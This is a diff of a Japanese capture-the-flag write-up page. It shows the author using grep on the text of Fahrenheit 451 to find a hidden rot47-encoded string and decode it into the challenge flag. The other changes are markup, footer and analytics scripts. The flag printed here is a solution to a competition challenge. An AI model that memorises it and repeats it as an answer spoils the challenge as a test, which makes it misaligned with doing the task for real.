+案2：10文字以上の単語を全部出してみるとか。
 <pre>
 $ cat Fahrenheit_451_Full_Text.txt | grep -o -w '\w\{10,\}' | sort | uniq
 </pre>
-<p>==&gt; これもダメでした。前述のと同じ理由で、フラグの箇所がそもそも単語とみなされないため。</p>
-<p><br />
-案3：以下は、空白文字以外の文字が15個以上連続しているものの検索です。これでいけました。</p>
+==> これもダメでした。前述のと同じ理由で、フラグの箇所がそもそも単語とみなされないため。
+<br />
+案3：以下は、空白文字以外の文字が15個以上連続しているものの検索です。これでいけました。
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1567,21 +1562,21 @@ $ cat Fahrenheit_451_Full_Text.txt | grep -o -w '\w\{10,\}' | sort | uniq
 </span></span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sh" data-lang="sh">$ cat Fahrenheit_451_Full_Text.txt <span class="p">|</span> grep -o <span class="s1">&#39;\S\{15,\}&#39;</span>
-black-beetle-coloured
-two-hundred-foot-long
-mosquito-delicate
-sleeping-tablets
-contra-sedative
-sleeping-tablets,
-<span class="hl">2F4E7L3FC?0E9603@@&lt;DPP<span class="sb">`</span>PN
-</span>:</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ cat Fahrenheit_451_Full_Text.txt <span class="p">|</span> grep -o <span class="s1">&#39;\S\{15,\}&#39;</span>
+</span></span><span class="line"><span class="cl">black-beetle-coloured
+</span></span><span class="line"><span class="cl">two-hundred-foot-long
+</span></span><span class="line"><span class="cl">mosquito-delicate
+</span></span><span class="line"><span class="cl">sleeping-tablets
+</span></span><span class="line"><span class="cl">contra-sedative
+</span></span><span class="line"><span class="cl">sleeping-tablets,
+</span></span><span class="line hl"><span class="cl">2F4E7L3FC?0E9603@@&lt;DPP<span class="sb">`</span>PN
+</span></span><span class="line"><span class="cl">:</span></span></code></pre></td></tr></table>
 </div>
 </div>
-<p><br />
-あとは、SUBSTITUTEということで、rotをいろいろ試すだけです。（rot47でした）</p>
-<p><br />
-Flag: <code>auctf{burn_the_books!!1!}</code></p>
+<br />
+あとは、SUBSTITUTEということで、rotをいろいろ試すだけです。（rot47でした）
+<br />
+Flag: `auctf{burn_the_books!!1!}`
 <p><br /><br />
 <br /><br /></p>
 <hr>
@@ -1637,7 +1632,7 @@ Flag: <code>auctf{burn_the_books!!1!}</code></p>
     <footer id="footer" class="footer">
       <div class="social-links">
       <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
-  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+  
 </div>
 
 <div class="copyright">
@@ -1672,20 +1667,21 @@ Flag: <code>auctf{burn_the_books!!1!}</code></p>
 
 
 
-<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
 
 
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 	ga('create', 'UA-104910699-2', 'auto');
 	ga('set', 'anonymizeIp', true);
 	ga('send', 'pageview');
 }
 </script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
 
 
 
